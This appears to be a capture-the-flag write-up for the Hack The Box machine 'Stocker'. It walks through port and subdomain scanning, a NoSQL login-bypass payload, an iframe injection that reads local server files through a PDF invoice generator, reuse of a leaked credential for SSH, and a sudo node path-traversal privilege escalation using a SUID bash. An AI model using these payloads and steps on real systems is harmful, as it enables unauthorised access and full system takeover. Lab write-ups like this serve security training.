---
layout: post
author: H4-L0
---

![image](/images/Pasted image 20230206212512.png)

[link](https://app.hackthebox.com/machines/Stocker)

# Enumeration

## nmap

```shell
$ nmap -sV -p- stocker
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 14:32 EST
Nmap scan report for stocker (10.10.11.196)
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

only 2 ports are open.
- `22` ssh-service
- `80` nginx web server

## webpage

![image](/images/Pasted image 20230206212902.png)

the website had nothing special for us.

## dir scan and subdomain scan

```shell
$ ffuf -w `fzf-wordlist` -u http://stocker.htb -H "Host: FUZZ.stocker.htb" -fs 178

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 52ms]
:: Progress: [100000/100000] :: Job [1/1] :: 940 req/sec :: Duration: [0:01:47] :: Errors: 0 ::
```

the directory scan ended with no meaningful results. then we tried to scan for subdomains and got a hit with `dev`.

after adding the `dev.stocker.htb` to the `/etc/hosts` file we could reach a login page.

![image](/images/Pasted image 20230206213415.png)

wie found a static site generator framework named `hugo` in the source code.

![image](/images/Pasted image 20230206213548.png)

after researching and trying different sql injections we got a hint, that you can build hugo also with an non sql database.

## nosql login bypass

and we bypassed the login with `burp` and this payload.

```
{"username": {"$ne": null}, "password": {"$ne": null} }
```

don't forget to change the `Content-Type` to `application/json`

![image](/images/Pasted image 20230206220000.png)

we got a redirection to `/stock` that we follow in our original browser.

![image](/images/Pasted image 20230206220019.png)

request in the original session and copy the URL into the browser.

![image](/images/Pasted image 20230206220052.png)

we are now able to buy stock. 

![image](/images/Pasted image 20230206215935.png)

when we added a few items and submit the order we were presented with a generated `pdf` invoice.

![image](/images/Pasted image 20230206220430.png)

![image](/images/Pasted image 20230206220446.png)

first we checked the request with `burp`

![image](/images/Pasted image 20230206220716.png)

we experimented a bit and found out that the `pdf` is vulnerable to XSS.
so we searched and found a way to read sensible data with this payload.

`<iframe width=1000 height=1000 src=file:///etc/passwd></iframe>`

![image](/images/Pasted image 20230125211938.png)

![image](/images/Pasted image 20230125211915.png)

then we tried to locate the `index.js` file because the server responded with Header `x-Powered-By: Express`. so we tried a few paths and found `index.js` with this one.

```
"<iframe width=1000 height=1000 src=file:///var/www/dev/index.js></iframe>"
```

![image](/images/Pasted image 20230125213815.png)

we found the credentials to a mongo database and tried to get in via SSH.

`dev:IHeardPassphrasesArePrettySecure`

the user `angoose` from the `/etc/passwd` had a login shell, so we tried this user with the password.

and it worked.

![image](/images/Pasted image 20230227223831.png)

in the home directory of `angoose` we found the first flag

```shell
angoose@stocker:/home/angoose# cat user.txt
afa**************************c76
```

# Privilege Escalation

```shell
angoose@stocker:~$ sudo -l
[sudo] password for angoose:
Sorry, try again.
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

`sudo -l` got us the hint, that we can execute all script in `/usr/local/scripts/` end with `.js` as root with this node binary located here: `/usr/bin/node`

we thought that it might be possible to execute all javascript files with a bit of path traversal.

```shell
$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/exploit.js
```

so we first checked if we could add the `suid` bit to the bash binary.

```javascript
const spawn = require('child_process').spawn;
spawn('chmod', ['u+s', '/bin/bash'], {stdio: 'inherit'});
```

we checked the binary and it worked.

```shell
$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

next we run the script again to spawn a shell that preserves privileges to get root.

```javascript
const spawn = require('child_process').spawn;
spawn('/bin/bash', ['-p'], {stdio: 'inherit' });
```

```shell
root@stocker:/home/angoose# cat /root/root.txt
cd6a**************************84
```

and we are root and got the last flag.

[H4] & [L0]
